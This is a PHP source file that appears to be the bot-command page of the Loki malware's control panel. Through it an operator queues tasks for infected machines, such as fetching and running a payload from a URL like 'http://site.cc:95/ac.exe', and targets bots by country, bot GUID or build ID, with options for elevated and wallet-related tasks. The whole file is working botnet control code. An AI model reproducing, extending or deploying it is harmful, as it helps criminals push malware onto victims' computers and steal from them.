<?php
	if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) die();
	
	$Guid__ = "";
	if(isset($_REQUEST['iCt']))
	{
		$Wallet = 0;
		if(Assign_($_REQUEST['iCc'], 1, 0, 1) == "on")
			$Wallet = 1;
		$Elevated = 0;
		if(Assign_($_REQUEST['iCe'], 1, 0, 1) == "on")
			$Elevated = 1;
		$Duplicate = 0;
		if(Assign_($_REQUEST['iCd'], 1, 0, 1) == "on")
			$Duplicate = 1;
		
		$LokiDBCon->InsertCommand(
		Assign_($_REQUEST['iCm'], 1, 0, 1), 
		Assign_($_REQUEST['iDa'], 1, 0, 1),
		Assign_($_REQUEST['iCo'], 1, 0, 1),
		Assign_($_REQUEST['iLi'], 1, 0, 1), 
		$Wallet, //wallet
		$Elevated, //Elevated
		Assign_($_REQUEST['iBi'], 1, 0, 1),
		Assign_($_REQUEST['iBv'], 1, 0, 1),
		Assign_($_REQUEST['iCt'], 1, 0, 1),
		Assign_($_REQUEST['iTi'], 1, 0, 1),
		$Duplicate,
		Assign_($_REQUEST['iBg'], 1, 0, 1)
		);
	}
	else if(isset($_REQUEST['ca']) && isset($_REQUEST['id']))
	{
		$Command = trim($_REQUEST['ca']);
		$ID_	 = trim($_REQUEST['id']);
		
		if($Command == "d")
			$LokiDBCon->RemoveCommand($ID_);
		else if($Command == "s")
		{
			$State	 = trim($_REQUEST['st']);
			if($State == 0)
				$State = 1;
			else
				$State = 0;
			
			$LokiDBCon->ChangeCommandState($ID_, $State);
		}
	}
	else if(isset($_REQUEST['bc']))
	{
		$Guid__ = trim($_REQUEST['bc']);
	}
	$PageSearch = '';
	$DataTable = $LokiDBCon->GetCommands($StartFrom, $PageLimit);
	$TotalPages = ceil($DataTable["NumOfTotal"] / $PageLimit);
	
	$ScriptURL = $ScriptURL."?".ACTVALUE_."=command";
	?>
			<div class="row">
				<div class='col-md-1 sidebar'></div>
				<div class='col-md-10 main'>
					<h3><?php GetText_('command_table_addnew'); ?></h3>
						<form method="POST" class="form-horizontal" action="<?php echo $ScriptURL; ?>">
							<div class="col-sm-5 col-sm-offset-1">
                                <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('command_table_comment'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="" name="iCm" class="form-control input-sm" /></div>
                                </div>
								
                                 <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('reportv_table_country'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="" name="iCo" placeholder="us,de,gb or all" class="form-control input-sm" /></div>
                                </div>
								
                                 <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('command_table_dateurl'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="" name="iDa" placeholder="http://site.cc:95/ac.exe or 60(s)" class="form-control input-sm" /></div>
                                </div>
                                <div class="form-group has-feedback">
									<h5><label class="control-label col-sm-4"><?php GetText_('command_table_type'); ?></label></h5>
									<div class="col-sm-8" >
										<select class="form-control" name="iCt" id="iCt">';
										<?php
											foreach($CommandsDB as $Key => $Value)
												echo '<option value="'.$Key.'">'.$Value.'</option>';
										?>	
										</select>
									</div>
                                </div>
									
								<div class="form-group has-feedback">	
									<div class="col-sm-8 col-sm-offset-7">
										<button type="submit" class="btn-sm btn btn-primary"><?php GetText_('settings_add'); ?></button>
									</div>
								</div>
							</div>
							<div class="col-sm-5">
                                <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('command_table_limit'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="" placeholder="1000 or 0 (unlimited)" id="iLi" name="iLi" class="form-control input-sm" /></div>
                                </div>
								
                                 <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('command_table_timelimit'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="" placeholder="360 (sec)" id="iTi" name="iTi" disabled="" class="form-control input-sm" /></div>
                                </div>
								
                                 <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('command_table_binid'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="" placeholder="ABC123SELL" name="iBi" class="form-control input-sm" /></div>
                                </div>
								
                                <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4"><?php GetText_('command_table_bguid'); ?></label></h5>
									<div class="col-sm-8"><input type="text" value="<?php echo $Guid__; ?>" placeholder="ABCD...." name="iBg" class="form-control input-sm" /></div>
                                </div>
								
                              <!--   <div class="form-group has-feedback">
                                    <h5><label class="control-label col-sm-4">Bin Version</label></h5>
									<div class="col-sm-8"><input type="text" value="" placeholder="<1.1 or 1<" name="iBv" class="form-control input-sm" /></div>
                                </div>
								-->
                                 <div class="form-group has-feedback">
									<div class="col-sm-3 col-sm-offset-2"><label><input name="iCe" type="checkbox"> <?php GetText_('command_table_elevated'); ?></label></div>
									<div class="col-sm-4"><label><input name="iCc" type="checkbox"> <?php GetText_('command_table_coin_related'); ?></label></div>
									<div class="col-sm-3"><label><input name="iCd" type="checkbox"> <?php GetText_('command_table_duplicate'); ?></label></div>
                                </div>
							</div>
                        </form>
				</div>
				<div class='col-md-1 sidebar'></div>
			</div>
			
			<div class="row">
				<div class='col-md-0 sidebar'></div>
				<div class='col-md-12 main'>
					<h3><?php GetText_('command_table_commmandlist'); ?></h3>
					
					<table class="table-condensed" id="events_" >
					<thead>
						<tr>
							<th data-sortable="false"  data-halign="center" data-align="center">ID</th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('command_table_command'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('http_table_data'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('reportv_table_country'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('command_table_limit'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('command_table_loads'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('command_table_active'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('command_table_timelimit'); ?></th>
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('command_table_comment'); ?></th>
							
							<th data-sortable="false"  data-halign="center" data-align="center"><?php GetText_('settings_admin_new_action'); ?></th>
						</tr>
					</thead>	
					<tbody>
					<?php
						$Counter = 0;
						while($DataTable["NumOfData"] > $Counter)
						{
							$Country = "";
							if($DataTable[$Counter]["command_country"] == "0")
								$Country = GetText_('command_table_all', 0);
							else
								$Country = $DataTable[$Counter]["command_country"];
							
							$Active = GetText_('command_table_yes', 0);
							$ActiveTxt = GetText_('command_table_stop', 0);
							if($DataTable[$Counter]["command_active"] == 0)
							{
								$Active = GetText_('command_table_no', 0);
								$ActiveTxt = GetText_('command_table_start', 0);
							}
								
							
							$TimeLimit = "-";
							if($DataTable[$Counter]["command_time_limit"] != 0)
								$TimeLimit = $DataTable[$Counter]["command_time_limit"];
							
							$Limit = "Unlimited";
							if($DataTable[$Counter]["command_limit"] != "0")
								$Limit = $DataTable[$Counter]["command_limit"];
							
							$Comment = "-";
							if(strlen($DataTable[$Counter]["command_comment"]))
								$Comment = $DataTable[$Counter]["command_comment"];
							
							$Data = "-";
							if(strlen($DataTable[$Counter]["command_data"]))
								$Data = $DataTable[$Counter]["command_data"];
							
							if(strlen($DataTable[$Counter]["command_bot_guid"]) > 2)
								$Data .= ", " . $DataTable[$Counter]["command_bot_guid"];
							
							if(strlen($DataTable[$Counter]["command_bin_id"]) > 2)
								$Data .= ", " . $DataTable[$Counter]["command_bin_id"];
							
							echo '<tr>
										<td>'.$DataTable[$Counter]["command_id"].'</td>
										<td>'.$CommandsDB[$DataTable[$Counter]["command_type"]].'</td>
										<td>'.$Data.'</td>
										<td>'.$Country.'</td>
										<td>'.$Limit.'</td>
										<td>'.$DataTable[$Counter]["command_loaded"].'</td>
										<td>'.$Active.'</td>
										<td>'.$TimeLimit.'</td>
										<td>'.$Comment.'</td>
										
										<td><a href="' .$ScriptURL."&ca=s&st=".$DataTable[$Counter]["command_active"]."&id=".$DataTable[$Counter]["command_id"]. '">'.$ActiveTxt .'</a> | <a href="' .$ScriptURL."&ca=d&id=".$DataTable[$Counter]["command_id"]. '">'.GetText_('command_table_delete', 0).'</a></td>
									</tr>';
							$Counter++;
						}
					?>
					
					</tbody>
					</table>

					<?php Pagination($TotalPages, $PageID, $PageLimit, ACTVALUE_, $Action.$PageSearch."&tD=".$DataTable["NumOfTotal"], $DataTable); ?>
				</div>
				<div class='col-md-1 sidebar'></div>
			</div>
		</div>
	</div>
	</div>
	</body>
</html>
